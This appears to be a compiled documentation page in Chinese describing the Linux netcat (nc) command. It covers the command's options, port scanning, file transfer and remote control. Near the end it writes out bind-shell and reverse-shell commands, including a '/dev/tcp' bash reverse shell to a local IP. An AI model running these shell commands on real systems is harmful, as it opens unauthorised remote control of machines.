import{_ as s,c as n,o as a,a as l}from"./app.82736834.js";const b=JSON.parse('{"title":"nc","description":"","frontmatter":{},"headers":[{"level":2,"title":"补充说明","slug":"补充说明","link":"#补充说明","children":[{"level":3,"title":"语法","slug":"语法","link":"#语法","children":[]},{"level":3,"title":"选项","slug":"选项","link":"#选项","children":[]},{"level":3,"title":"实例","slug":"实例","link":"#实例","children":[]}]}],"relativePath":"linux/command/pages/nc.md","lastUpdated":1666509709000}'),p={name:"linux/command/pages/nc.md"},e=l(`<h1 id="nc" tabindex="-1">nc <a class="header-anchor" href="#nc" aria-hidden="true">#</a></h1><p>用于设置路由器，是网络工具中的瑞士军刀。</p><h2 id="补充说明" tabindex="-1">补充说明 <a class="header-anchor" href="#补充说明" aria-hidden="true">#</a></h2><p><strong>nc命令</strong> 全称<strong>netcat</strong>，用于设置路由器。它能通过 TCP 和 UDP 在网络中读写数据。通过与其他工具结合和重定向，你可以在脚本中以多种方式使用它。使用 netcat 命令所能完成的事情令人惊讶。</p><h3 id="语法" tabindex="-1">语法 <a class="header-anchor" href="#语法" aria-hidden="true">#</a></h3><div class="language-shell line-numbers-mode"><button title="Copy Code" class="copy"></button><span class="lang">shell</span><pre class="shiki material-theme-darker" tabindex="0"><code><span class="line"><span style="color:#FFCB6B;">nc</span><span style="color:#EEFFFF;"> </span><span style="color:#89DDFF;">[</span><span style="color:#EEFFFF;">-hlnruz</span><span style="color:#89DDFF;">][</span><span style="color:#EEFFFF;">-g</span><span style="color:#89DDFF;">&lt;</span><span style="color:#EEFFFF;">网关...</span><span style="color:#89DDFF;">&gt;][</span><span style="color:#EEFFFF;">-G</span><span style="color:#89DDFF;">&lt;</span><span style="color:#EEFFFF;">指向器数目</span><span style="color:#89DDFF;">&gt;][</span><span style="color:#EEFFFF;">-i</span><span style="color:#89DDFF;">&lt;</span><span style="color:#EEFFFF;">延迟秒数</span><span style="color:#89DDFF;">&gt;][</span><span style="color:#EEFFFF;">-o</span><span style="color:#89DDFF;">&lt;</span><span style="color:#EEFFFF;">输出文件</span><span style="color:#89DDFF;">&gt;][</span><span style="color:#EEFFFF;">-p</span><span style="color:#89DDFF;">&lt;</span><span style="color:#EEFFFF;">通信端口</span><span style="color:#89DDFF;">&gt;]</span></span>
<span class="line"><span style="color:#89DDFF;">[</span><span style="color:#EEFFFF;">-s</span><span style="color:#89DDFF;">&lt;</span><span style="color:#EEFFFF;">来源位址</span><span style="color:#89DDFF;">&gt;][</span><span style="color:#EEFFFF;">-v...</span><span style="color:#89DDFF;">][</span><span style="color:#EEFFFF;">-w</span><span style="color:#89DDFF;">&lt;</span><span style="color:#EEFFFF;">超时秒数</span><span style="color:#89DDFF;">&gt;][</span><span style="color:#EEFFFF;">主机名称</span><span style="color:#89DDFF;">][</span><span style="color:#EEFFFF;">通信端口...</span><span style="color:#89DDFF;">]</span></span>
<span class="line"></span></code></pre><div class="line-numbers-wrapper" aria-hidden="true"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><h3 id="选项" tabindex="-1">选项 <a class="header-anchor" href="#选项" aria-hidden="true">#</a></h3><div class="language-shell line-numbers-mode"><button title="Copy Code" class="copy"></button><span class="lang">shell</span><pre class="shiki material-theme-darker" tabindex="0"><code><span class="line"><span style="color:#FFCB6B;">-g</span><span style="color:#EEFFFF;"> </span><span style="color:#89DDFF;">&lt;</span><span style="color:#C3E88D;">网</span><span style="color:#EEFFFF;">关</span><span style="color:#89DDFF;">&gt;</span><span style="color:#EEFFFF;"> </span><span style="color:#545454;font-style:italic;"># 设置路由器跃程通信网关，最多可设置8个。</span></span>
<span class="line"><span style="color:#FFCB6B;">-G&lt;指向器数目&gt;</span><span style="color:#EEFFFF;"> </span><span style="color:#545454;font-style:italic;"># 设置来源路由指向器，其数值为4的倍数。</span></span>
<span class="line"><span style="color:#FFCB6B;">-h</span><span style="color:#EEFFFF;"> </span><span style="color:#C3E88D;">在线帮助。</span></span>
<span class="line"><span style="color:#FFCB6B;">-i&lt;延迟秒数&gt;</span><span style="color:#EEFFFF;"> </span><span style="color:#C3E88D;">设置时间间隔，以便传送信息及扫描通信端口。</span></span>
<span class="line"><span style="color:#FFCB6B;">-l</span><span style="color:#EEFFFF;"> </span><span style="color:#C3E88D;">使用监听模式，管控传入的资料。</span></span>
<span class="line"><span style="color:#FFCB6B;">-n</span><span style="color:#EEFFFF;"> </span><span style="color:#C3E88D;">直接使用IP地址，而不通过域名服务器。</span></span>
<span class="line"><span style="color:#FFCB6B;">-o&lt;输出文件&gt;</span><span style="color:#EEFFFF;"> </span><span style="color:#545454;font-style:italic;"># 指定文件名称，把往来传输的数据以16进制字码倾倒成该文件保存。</span></span>
<span class="line"><span style="color:#FFCB6B;">-p&lt;通信端口&gt;</span><span style="color:#EEFFFF;"> </span><span style="color:#545454;font-style:italic;"># 设置本地主机使用的通信端口。</span></span>
<span class="line"><span style="color:#FFCB6B;">-r</span><span style="color:#EEFFFF;"> </span><span style="color:#C3E88D;">乱数指定本地与远端主机的通信端口。</span></span>
<span class="line"><span style="color:#FFCB6B;">-s&lt;来源位址&gt;</span><span style="color:#EEFFFF;"> </span><span style="color:#545454;font-style:italic;"># 设置本地主机送出数据包的IP地址。</span></span>
<span class="line"><span style="color:#FFCB6B;">-u</span><span style="color:#EEFFFF;"> </span><span style="color:#C3E88D;">使用UDP传输协议。</span></span>
<span class="line"><span style="color:#FFCB6B;">-v</span><span style="color:#EEFFFF;"> </span><span style="color:#C3E88D;">显示指令执行过程。</span></span>
<span class="line"><span style="color:#FFCB6B;">-w&lt;超时秒数&gt;</span><span style="color:#EEFFFF;"> </span><span style="color:#545454;font-style:italic;"># 设置等待连线的时间。</span></span>
<span class="line"><span style="color:#FFCB6B;">-z</span><span style="color:#EEFFFF;"> </span><span style="color:#C3E88D;">使用0输入/输出模式，只在扫描通信端口时使用。</span></span>
<span class="line"></span></code></pre><div class="line-numbers-wrapper" aria-hidden="true"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br></div></div><h3 id="实例" tabindex="-1">实例 <a class="header-anchor" href="#实例" aria-hidden="true">#</a></h3><p><strong>TCP端口扫描</strong></p><div class="language-shell line-numbers-mode"><button title="Copy Code" class="copy"></button><span class="lang">shell</span><pre class="shiki material-theme-darker" tabindex="0"><code><span class="line"><span style="color:#89DDFF;">[</span><span style="color:#EEFFFF;">root@localhost </span><span style="color:#89DDFF;">~]</span><span style="color:#EEFFFF;"># nc -v -z -w2 192.168.0.3 </span><span style="color:#F78C6C;">1</span><span style="color:#EEFFFF;">-</span><span style="color:#F78C6C;">100</span><span style="color:#EEFFFF;"> </span></span>
<span class="line"><span style="color:#EEFFFF;">192.168.0.3: inverse host lookup failed: Unknown host</span></span>
<span class="line"><span style="color:#89DDFF;">(</span><span style="color:#FFCB6B;">UNKNOWN</span><span style="color:#89DDFF;">)</span><span style="color:#EEFFFF;"> </span><span style="color:#89DDFF;">[</span><span style="color:#EEFFFF;">192.168.0.3</span><span style="color:#89DDFF;">]</span><span style="color:#EEFFFF;"> </span><span style="color:#F78C6C;">80</span><span style="color:#EEFFFF;"> </span><span style="color:#89DDFF;">(</span><span style="color:#FFCB6B;">http</span><span style="color:#89DDFF;">)</span><span style="color:#EEFFFF;"> open</span></span>
<span class="line"><span style="color:#89DDFF;">(</span><span style="color:#FFCB6B;">UNKNOWN</span><span style="color:#89DDFF;">)</span><span style="color:#EEFFFF;"> </span><span style="color:#89DDFF;">[</span><span style="color:#EEFFFF;">192.168.0.3</span><span style="color:#89DDFF;">]</span><span style="color:#EEFFFF;"> </span><span style="color:#F78C6C;">23</span><span style="color:#EEFFFF;"> </span><span style="color:#89DDFF;">(</span><span style="color:#FFCB6B;">telnet</span><span style="color:#89DDFF;">)</span><span style="color:#EEFFFF;"> open</span></span>
<span class="line"><span style="color:#89DDFF;">(</span><span style="color:#FFCB6B;">UNKNOWN</span><span style="color:#89DDFF;">)</span><span style="color:#EEFFFF;"> </span><span style="color:#89DDFF;">[</span><span style="color:#EEFFFF;">192.168.0.3</span><span style="color:#89DDFF;">]</span><span style="color:#EEFFFF;"> </span><span style="color:#F78C6C;">22</span><span style="color:#EEFFFF;"> </span><span style="color:#89DDFF;">(</span><span style="color:#FFCB6B;">ssh</span><span style="color:#89DDFF;">)</span><span style="color:#EEFFFF;"> open</span></span>
<span class="line"></span></code></pre><div class="line-numbers-wrapper" aria-hidden="true"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br></div></div><p>扫描192.168.0.3 的端口 范围是 1-100 <strong>扫描UDP端口</strong></p><div class="language-shell line-numbers-mode"><button title="Copy Code" class="copy"></button><span class="lang">shell</span><pre class="shiki material-theme-darker" tabindex="0"><code><span class="line"><span style="color:#89DDFF;">[</span><span style="color:#EEFFFF;">root@localhost </span><span style="color:#89DDFF;">~]</span><span style="color:#EEFFFF;"># nc -u -z -w2 192.168.0.1 </span><span style="color:#F78C6C;">1</span><span style="color:#EEFFFF;">-</span><span style="color:#F78C6C;">1000</span><span style="color:#EEFFFF;">  </span><span style="color:#545454;font-style:italic;"># 扫描192.168.0.3 的端口 范围是 1-1000</span></span>
<span class="line"></span></code></pre><div class="line-numbers-wrapper" aria-hidden="true"><span class="line-number">1</span><br></div></div><p><strong>扫描指定端口</strong></p><div class="language-shell line-numbers-mode"><button title="Copy Code" class="copy"></button><span class="lang">shell</span><pre class="shiki material-theme-darker" tabindex="0"><code><span class="line"><span style="color:#89DDFF;">[</span><span style="color:#EEFFFF;">root@localhost </span><span style="color:#89DDFF;">~]</span><span style="color:#EEFFFF;"># nc -nvv 192.168.0.1 </span><span style="color:#F78C6C;">80</span><span style="color:#EEFFFF;"> </span><span style="color:#545454;font-style:italic;"># 扫描 80端口</span></span>
<span class="line"><span style="color:#89DDFF;">(</span><span style="color:#FFCB6B;">UNKNOWN</span><span style="color:#89DDFF;">)</span><span style="color:#EEFFFF;"> </span><span style="color:#89DDFF;">[</span><span style="color:#EEFFFF;">192.168.0.1</span><span style="color:#89DDFF;">]</span><span style="color:#EEFFFF;"> </span><span style="color:#F78C6C;">80</span><span style="color:#EEFFFF;"> </span><span style="color:#89DDFF;">(?)</span><span style="color:#EEFFFF;"> open</span></span>
<span class="line"><span style="color:#FFCB6B;">y</span><span style="color:#EEFFFF;">  </span><span style="color:#C3E88D;">//用户输入</span></span>
<span class="line"></span></code></pre><div class="line-numbers-wrapper" aria-hidden="true"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br></div></div><p>查看从服务器到目的地的出站端口 443 是否被防火墙阻止</p><div class="language-shell line-numbers-mode"><button title="Copy Code" class="copy"></button><span class="lang">shell</span><pre class="shiki material-theme-darker" tabindex="0"><code><span class="line"><span style="color:#FFCB6B;">nc</span><span style="color:#EEFFFF;"> </span><span style="color:#C3E88D;">-vz</span><span style="color:#EEFFFF;"> </span><span style="color:#C3E88D;">acme-v02.api.letsencrypt.org</span><span style="color:#EEFFFF;"> </span><span style="color:#F78C6C;">443</span><span style="color:#EEFFFF;"> </span><span style="color:#C3E88D;">-w2</span></span>
<span class="line"><span style="color:#545454;font-style:italic;"># Ncat: Version 7.50 ( https://nmap.org/ncat )</span></span>
<span class="line"><span style="color:#545454;font-style:italic;"># Ncat: Connected to 23.77.214.183:443.</span></span>
<span class="line"><span style="color:#545454;font-style:italic;"># Ncat: 0 bytes sent, 0 bytes received in 0.07 seconds.</span></span>
<span class="line"></span></code></pre><div class="line-numbers-wrapper" aria-hidden="true"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br></div></div><p><strong>文件传输</strong></p><div class="language-shell line-numbers-mode"><button title="Copy Code" class="copy"></button><span class="lang">shell</span><pre class="shiki material-theme-darker" tabindex="0"><code><span class="line"><span style="color:#545454;font-style:italic;"># 接收方提前设置监听端口与要接收的文件名（文件名可自定义）：</span></span>
<span class="line"><span style="color:#FFCB6B;">nc</span><span style="color:#EEFFFF;"> </span><span style="color:#C3E88D;">-lp</span><span style="color:#EEFFFF;"> </span><span style="color:#F78C6C;">8888</span><span style="color:#EEFFFF;"> </span><span style="color:#89DDFF;">&gt;</span><span style="color:#EEFFFF;"> </span><span style="color:#C3E88D;">node.tar.gz</span></span>
<span class="line"></span>
<span class="line"><span style="color:#545454;font-style:italic;"># 传输方发文件：</span></span>
<span class="line"><span style="color:#FFCB6B;">nc</span><span style="color:#EEFFFF;"> </span><span style="color:#C3E88D;">-nv</span><span style="color:#EEFFFF;"> </span><span style="color:#C3E88D;">192.168.75.121</span><span style="color:#EEFFFF;"> </span><span style="color:#F78C6C;">8888</span><span style="color:#EEFFFF;">  </span><span style="color:#89DDFF;">&lt;</span><span style="color:#EEFFFF;"> </span><span style="color:#C3E88D;">node_exporter-1.3.1.linux-amd64.tar.gz</span></span>
<span class="line"><span style="color:#545454;font-style:italic;"># ⚠️ 注意：192.168.75.121是接收方的ip地址。</span></span>
<span class="line"></span></code></pre><div class="line-numbers-wrapper" aria-hidden="true"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br></div></div><div class="language-shell line-numbers-mode"><button title="Copy Code" class="copy"></button><span class="lang">shell</span><pre class="shiki material-theme-darker" tabindex="0"><code><span class="line"><span style="color:#545454;font-style:italic;"># 如果希望文件传输结束后自动退出，可以使用下面的命令：</span></span>
<span class="line"><span style="color:#FFCB6B;">nc</span><span style="color:#EEFFFF;"> </span><span style="color:#C3E88D;">-lp</span><span style="color:#EEFFFF;"> </span><span style="color:#F78C6C;">8888</span><span style="color:#EEFFFF;"> </span><span style="color:#89DDFF;">&gt;</span><span style="color:#EEFFFF;"> </span><span style="color:#C3E88D;">node.tar.gz</span></span>
<span class="line"><span style="color:#FFCB6B;">nc</span><span style="color:#EEFFFF;"> </span><span style="color:#C3E88D;">-nv</span><span style="color:#EEFFFF;"> </span><span style="color:#C3E88D;">192.168.75.121</span><span style="color:#EEFFFF;"> </span><span style="color:#F78C6C;">8888</span><span style="color:#EEFFFF;"> </span><span style="color:#C3E88D;">-i</span><span style="color:#EEFFFF;"> </span><span style="color:#F78C6C;">1</span><span style="color:#EEFFFF;"> </span><span style="color:#89DDFF;">&lt;</span><span style="color:#EEFFFF;"> </span><span style="color:#C3E88D;">node_exporter-1.3.1.linux-amd64.tar.gz</span></span>
<span class="line"><span style="color:#545454;font-style:italic;"># ⚠️ 注意：-i 表示闲置超时时间</span></span>
<span class="line"></span></code></pre><div class="line-numbers-wrapper" aria-hidden="true"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br></div></div><p><strong>远程控制</strong></p><div class="language-shell line-numbers-mode"><button title="Copy Code" class="copy"></button><span class="lang">shell</span><pre class="shiki material-theme-darker" tabindex="0"><code><span class="line"><span style="color:#545454;font-style:italic;"># 正向控制，被控端主动设置监听端口及bash环境，控制端连接，如果有防火墙，需开放端口，否则会被拦截。</span></span>
<span class="line"><span style="color:#545454;font-style:italic;"># 被控制端执行下面的命令：</span></span>
<span class="line"><span style="color:#FFCB6B;">nc</span><span style="color:#EEFFFF;"> </span><span style="color:#C3E88D;">-lvnp</span><span style="color:#EEFFFF;"> </span><span style="color:#F78C6C;">8888</span><span style="color:#EEFFFF;"> </span><span style="color:#C3E88D;">-c</span><span style="color:#EEFFFF;"> </span><span style="color:#C3E88D;">bash</span></span>
<span class="line"><span style="color:#545454;font-style:italic;"># 控制端执行下面的命令：</span></span>
<span class="line"><span style="color:#FFCB6B;">nc</span><span style="color:#EEFFFF;"> </span><span style="color:#C3E88D;">192.168.75.121</span><span style="color:#EEFFFF;"> </span><span style="color:#F78C6C;">8888</span></span>
<span class="line"></span></code></pre><div class="line-numbers-wrapper" aria-hidden="true"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br></div></div><div class="language-shell line-numbers-mode"><button title="Copy Code" class="copy"></button><span class="lang">shell</span><pre class="shiki material-theme-darker" tabindex="0"><code><span class="line"><span style="color:#545454;font-style:italic;"># 反向控制，控制端设置监听端口，被控端主动连接控制端的ip及端口，并提供bash环境。</span></span>
<span class="line"><span style="color:#545454;font-style:italic;"># 控制端执行下面的命令：</span></span>
<span class="line"><span style="color:#FFCB6B;">nc</span><span style="color:#EEFFFF;"> </span><span style="color:#C3E88D;">-lvnp</span><span style="color:#EEFFFF;"> </span><span style="color:#F78C6C;">8888</span></span>
<span class="line"><span style="color:#545454;font-style:italic;"># 被控制端执行下面的命令：</span></span>
<span class="line"><span style="color:#FFCB6B;">nc</span><span style="color:#EEFFFF;"> </span><span style="color:#C3E88D;">192.168.75.121</span><span style="color:#EEFFFF;"> </span><span style="color:#F78C6C;">8888</span><span style="color:#EEFFFF;"> </span><span style="color:#C3E88D;">-c</span><span style="color:#EEFFFF;"> </span><span style="color:#C3E88D;">bash</span></span>
<span class="line"></span></code></pre><div class="line-numbers-wrapper" aria-hidden="true"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br></div></div><p><strong>反弹shell</strong></p><div class="language-shell line-numbers-mode"><button title="Copy Code" class="copy"></button><span class="lang">shell</span><pre class="shiki material-theme-darker" tabindex="0"><code><span class="line"><span style="color:#545454;font-style:italic;"># 控制端执行下面的命令：</span></span>
<span class="line"><span style="color:#FFCB6B;">nc</span><span style="color:#EEFFFF;"> </span><span style="color:#C3E88D;">-lvnp</span><span style="color:#EEFFFF;"> </span><span style="color:#F78C6C;">8888</span></span>
<span class="line"></span></code></pre><div class="line-numbers-wrapper" aria-hidden="true"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><div class="language- line-numbers-mode"><button title="Copy Code" class="copy"></button><span class="lang"></span><pre class="shiki material-theme-darker" tabindex="0"><code><span class="line"><span style="color:#EEFFFF;"># 被控端执行下面的命令:</span></span>
<span class="line"><span style="color:#EEFFFF;">bash -i &amp;&gt; /dev/tcp/192.168.75.121/8888 0&gt;&amp;1</span></span>
<span class="line"><span style="color:#EEFFFF;"></span></span></code></pre><div class="line-numbers-wrapper" aria-hidden="true"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div>`,26),o=[e];function F(t,r,c,i,y,E){return a(),n("div",null,o)}const D=s(p,[["render",F]]);export{b as __pageData,D as default};
